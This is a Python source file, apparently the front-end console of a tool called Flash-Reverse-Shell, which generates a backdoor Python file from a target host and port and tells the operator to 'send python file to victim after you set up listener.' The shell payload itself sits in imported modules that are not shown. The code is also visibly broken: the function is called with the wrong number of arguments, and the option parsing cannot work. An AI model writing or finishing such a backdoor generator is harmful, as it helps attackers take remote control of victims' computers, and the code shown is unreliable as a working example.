import client_side
import server_side
from termcolor import colored
import os


def create_rs(target_host, target_port):
    # Ask User desired File Name for the .py backdoor
    print('How do you want to name the file?')
    file_name = input()
    # Ask User desired path for mentioned File
    print('Where do you want to store the output files?')
    path_input = input()
    # Declare complete variable consisting of path to end-directory and file name
    complete_path = ''
    # Check if path exists, if yes set path
    if os.path.exists(path_input):
        path = path_input
        # Check if file already exists
        if os.path.isfile(path + file_name):
            print(colored('File already exists, please choose another name!', 'red'))
        else:
            # Set the complete path of the backdoor file
            complete_path = path + '\\' + file_name
        # And finally, run the client side main function to write backdoor file
        client_side.main(target_host, target_port, complete_path)
        if os.path.isfile(complete_path):
            print(colored('Successfully executed, please send python file to victim after you set up listener.', 'green'))
        else:
            print(colored('Could not create File. An Error has occurred!', 'red'))

    else:
        print(colored('Path "' + path_input + '" doesnt exist!', 'red'))


print(colored('WELCOME TO FLASH-REVERSE-SHELL!', 'blue'))
print(colored('For documentation on commands and uses, please visit the following repository:'))
print("https://github.com/FujiwaraChoki/Flash-Keylogger")

while True:
    console_command = input('flashconsole > ')
    parts = console_command.split(" ")
    if console_command == 'flashrs '+parts[1]:
        while True:
            options = input('flashrs > ')
            parts_options = options.split(" ")
            thost = ''
            lhost = ''
            port = 0
            if '--create' in options:
                if options == 'THOST='+parts_options[1]:
                    thost = parts_options[1]
                elif options == 'LHOST='+parts_options[2]:
                    lhost = parts_options[1]
                elif options == 'PORT='+str(parts_options[3]):
                    port = parts_options[1]
                create_rs(thost, lhost, port)
